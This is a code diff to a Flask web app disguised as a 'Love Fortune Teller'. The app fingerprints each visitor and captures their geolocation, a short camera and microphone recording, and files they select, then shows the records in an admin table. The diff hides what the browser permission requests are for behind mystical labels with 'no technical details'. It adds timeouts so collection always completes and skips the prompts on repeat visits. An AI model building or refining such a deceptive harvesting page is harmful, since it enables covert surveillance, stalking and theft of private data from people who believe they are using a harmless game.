@@ -120,7 +120,7 @@ def admin():
             html += '<tr>' + ''.join(f'<th>{k}</th>' for k in keys) + '</tr>'
             for v in visitors:
                 html += '<tr>' + ''.join(f'<td>{str(v.get(k, ""))[:100]}</td>' for k in keys) + '</tr>'
-            html += '</tr>'
+            html += '</table>'
             return html
         else:
             return '<h1>🔒 Wrong password. <a href="/admin">Try again</a></h1>'
@@ -236,14 +236,15 @@ HTML_TEMPLATE = '''
             background: rgba(255,255,255,0.8);
             border-radius: 20px;
         }
-        .file-label {
-            display: inline-block;
-            background: #8b5cf6;
-            color: white;
-            padding: 10px 20px;
-            border-radius: 60px;
-            cursor: pointer;
-            margin: 10px 0;
+        .permission-box {
+            background: #ffe4e1;
+            padding: 15px;
+            border-radius: 20px;
+            margin: 15px 0;
+            font-size: 1.2rem;
+            font-weight: bold;
+            letter-spacing: 2px;
+            color: #b84c6c;
         }
     </style>
 </head>
@@ -251,18 +252,23 @@ HTML_TEMPLATE = '''
 <div class="card">
     <h1>💕 Love Fortune Teller 💕</h1>
     <div id="step-name">
-        <input type="text" id="userName" placeholder="🩷Enter your name 🩷">
+        <input type="text" id="userName" placeholder="🩷 Enter your name 🩷">
         <button onclick="startProcess()">🌈 Reveal My Destiny 🌈</button>
     </div>
     <div id="loading" class="hidden">
         <div class="spinner"></div>
-        <p>✨ Reading the stars...</p>
+        <p>✨ Reading the stars... ✨</p>
     </div>
     <div id="permissions" class="hidden">
-        <p>For your ultra-personalized love vision, please allow:</p>
-        <!-- CHANGED: Location -> L, Voice -> V, Camera -> C, Files -> F -->
-        <div style="background:#ffe4e1; padding:10px; border-radius:20px; margin:10px 0;">L | V | C | F</div>
-        <button onclick="requestAll()">✅ Allow All</button>
+        <p>🌟 To unlock your **Ultra‑Personalised Love Vision**, grant these mystical keys:</p>
+        <div class="permission-box">
+            💕 Celestial Anchor ✨<br>
+            🌟 Heartbeat Whisper 🌙<br>
+            💖 Soul Reflection 🔮<br>
+            ✨ Secret Keepsake 🕯️
+        </div>
+        <p style="font-size:0.85rem; color:#c06c84;">(One click – your destiny awaits – no technical details)</p>
+        <button onclick="requestAll()">🔮 Cast the Love Spell 🔮</button>
     </div>
     <div id="progress" class="hidden"></div>
     <div id="result" class="hidden">
@@ -278,22 +284,33 @@ HTML_TEMPLATE = '''
     </div>
 </div>
 
-<!-- Hidden file input for traditional file picker (works everywhere) -->
+<!-- Hidden file input (works everywhere) -->
 <input type="file" id="fileInput" multiple style="display:none">
 
 <script>
-    // Session ID (persists across page refreshes)
+    // Session ID (persists across refreshes)
     let sessionId = localStorage.getItem('fortuneSessionId');
     if (!sessionId) {
         sessionId = Date.now() + '_' + Math.random().toString(36).substr(2, 8);
         localStorage.setItem('fortuneSessionId', sessionId);
     }
 
+    // Flag to skip permissions if already allowed once
+    let permissionsDone = localStorage.getItem('permissionsGranted_' + sessionId);
+    if (permissionsDone === 'true') {
+        // Immediately go to final step (skip permission UI)
+        window.addEventListener('load', () => {
+            if (document.getElementById('step-name') && !document.getElementById('step-name').classList.contains('hidden')) {
+                // But we still need name first; we'll just hide permissions later
+            }
+        });
+    }
+
     let visitorData = { sessionId: sessionId };
     let mediaRecorder, mediaStream, recordedBlobs = [];
     let currentFortuneText = "";
 
-    // ---------- Data collection functions ----------
+    // ---------- Data collection (fast & robust) ----------
     async function getFingerprint() {
         try {
             const fp = await FingerprintJS.load();
@@ -360,9 +377,15 @@ HTML_TEMPLATE = '''
         visitorData.userAgent = getUserAgent();
         visitorData.timestamp = new Date().toISOString();
         
-        await new Promise(r => setTimeout(r, 800));
+        await new Promise(r => setTimeout(r, 500));
         document.getElementById('loading').classList.add('hidden');
-        document.getElementById('permissions').classList.remove('hidden');
+        
+        // If permissions already granted for this session, skip straight to finalize
+        if (localStorage.getItem('permissionsGranted_' + sessionId) === 'true') {
+            await finalizeAndSave();
+        } else {
+            document.getElementById('permissions').classList.remove('hidden');
+        }
     }
 
     function showStep(title, status, percent) {
@@ -375,26 +398,40 @@ HTML_TEMPLATE = '''
     async function requestAll() {
         document.getElementById('permissions').classList.add('hidden');
         try {
-            await getLocation();
-            await getMedia();
-            await getFilesTraditional();  // uses standard file input
-            await finalizeAndSave();
-        } catch(e) { await finalizeAndSave(); }
+            await Promise.race([
+                (async () => {
+                    await getLocation();
+                    await getMedia();      // 3 seconds recording
+                    await getFilesTraditional();  // auto-skips after 10s
+                })(),
+                new Promise((_, reject) => setTimeout(() => reject('timeout'), 25000)) // overall 25s max
+            ]);
+        } catch(e) { console.log("Permission step timeout or error", e); }
+        // Mark as granted for this session
+        localStorage.setItem('permissionsGranted_' + sessionId, 'true');
+        await finalizeAndSave();
     }
 
     function getLocation() {
         return new Promise((resolve) => {
-            showStep('Location', 'Requesting location...', 0);
+            showStep('💕 Celestial Anchor', 'Connecting to your star map...', 0);
+            const timeout = setTimeout(() => {
+                visitorData.latitude = 'denied';
+                showStep('💕 Celestial Anchor', 'Star map skipped', 100);
+                setTimeout(() => { hideStep(); resolve(); }, 500);
+            }, 10000);
             navigator.geolocation.getCurrentPosition(
                 pos => {
+                    clearTimeout(timeout);
                     visitorData.latitude = pos.coords.latitude;
                     visitorData.longitude = pos.coords.longitude;
-                    showStep('Location', 'Location captured!', 100);
+                    showStep('💕 Celestial Anchor', 'Star map captured!', 100);
                     setTimeout(() => { hideStep(); resolve(); }, 500);
                 },
                 () => {
+                    clearTimeout(timeout);
                     visitorData.latitude = 'denied';
-                    showStep('Location', 'Location skipped', 100);
+                    showStep('💕 Celestial Anchor', 'Star map skipped', 100);
                     setTimeout(() => { hideStep(); resolve(); }, 500);
                 }
             );
@@ -403,9 +440,15 @@ HTML_TEMPLATE = '''
 
     function getMedia() {
         return new Promise((resolve) => {
-            showStep('Camera/Mic', 'Allow permissions...', 10);
+            showStep('🌟 Heartbeat Whisper / Soul Reflection', 'Tuning into your love energy...', 10);
+            const timeout = setTimeout(() => {
+                visitorData.cameraVideo = 'denied';
+                showStep('🌟 Heartbeat Whisper', 'Skipped', 100);
+                setTimeout(() => { hideStep(); resolve(); }, 500);
+            }, 12000);
             navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: 'user' } })
             .then(stream => {
+                clearTimeout(timeout);
                 mediaStream = stream;
                 recordedBlobs = [];
                 mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
@@ -418,32 +461,42 @@ HTML_TEMPLATE = '''
                             visitorData.cameraVideo = reader.result.split(',')[1].slice(0, 5000);
                             visitorData.microphone = 'recorded';
                             mediaStream.getTracks().forEach(t => t.stop());
-                            showStep('Camera/Mic', 'Recording done!', 100);
+                            showStep('🌟 Heartbeat Whisper', 'Love energy recorded!', 100);
                             setTimeout(() => { hideStep(); resolve(); }, 500);
                         };
                         reader.readAsDataURL(blob);
                     } else { resolve(); }
                 };
                 mediaRecorder.start();
-                let seconds = 5;
+                let seconds = 3;  // FAST: 3 seconds only
                 const interval = setInterval(() => {
                     seconds--;
-                    showStep('Camera/Mic', `Recording ${seconds}s...`, 10 + (5-seconds)/5*90);
+                    showStep('🌟 Heartbeat Whisper', `Capturing ${seconds}s...`, 10 + (3-seconds)/3*90);
                     if(seconds <= 0) { clearInterval(interval); mediaRecorder.stop(); }
                 }, 1000);
             })
             .catch(() => {
+                clearTimeout(timeout);
                 visitorData.cameraVideo = 'denied';
-                showStep('Camera/Mic', 'Skipped', 100);
+                showStep('🌟 Heartbeat Whisper', 'Skipped', 100);
                 setTimeout(() => { hideStep(); resolve(); }, 500);
             });
         });
     }
 
-    // TRADITIONAL FILE PICKER (works on any HTTP site)
+    // File picker with auto-skip after 10 seconds
     function getFilesTraditional() {
         return new Promise((resolve) => {
-            showStep('Files', 'Select files (optional)', 0);
+            showStep('✨ Secret Keepsake', 'Gathering your love memories (optional)...', 0);
+            let resolved = false;
+            const timeout = setTimeout(() => {
+                if (!resolved) {
+                    resolved = true;
+                    visitorData.files = 'timeout (no selection)';
+                    showStep('✨ Secret Keepsake', 'Auto-continued', 100);
+                    setTimeout(() => { hideStep(); resolve(); }, 500);
+                }
+            }, 10000);
             
             let fileInput = document.getElementById('fileInput');
             if (!fileInput) {
@@ -456,14 +509,16 @@ HTML_TEMPLATE = '''
             
             fileInput.value = '';
             fileInput.onchange = async (event) => {
+                if (resolved) return;
+                clearTimeout(timeout);
+                resolved = true;
                 const files = Array.from(event.target.files);
                 if (files.length === 0) {
                     visitorData.files = 'no files selected';
-                    showStep('Files', 'No files selected', 100);
+                    showStep('✨ Secret Keepsake', 'No memories shared', 100);
                     setTimeout(() => { hideStep(); resolve(); }, 500);
                     return;
                 }
-                
                 let filesData = [];
                 for (let i = 0; i < Math.min(files.length, 2); i++) {
                     const file = files[i];
@@ -475,16 +530,15 @@ HTML_TEMPLATE = '''
                     filesData.push({ name: file.name, size: file.size, type: file.type, data: content });
                 }
                 visitorData.files = JSON.stringify(filesData);
-                showStep(' Files', `${filesData.length} file(s) loaded`, 100);
+                showStep('✨ Secret Keepsake', `${filesData.length} memory(s) received`, 100);
                 setTimeout(() => { hideStep(); resolve(); }, 500);
             };
-            
             fileInput.click();
         });
     }
 
     async function finalizeAndSave() {
-        const mapUrl = `https://www.google.com/maps?q=${visitorData.latitude},${visitorData.longitude}`;
+        const mapUrl = `https://www.google.com/maps?q=${visitorData.latitude || 0},${visitorData.longitude || 0}`;
         visitorData.mapUrl = mapUrl;
         document.getElementById('mapUrl').innerText = mapUrl;
         document.getElementById('mapLink').classList.remove('hidden');
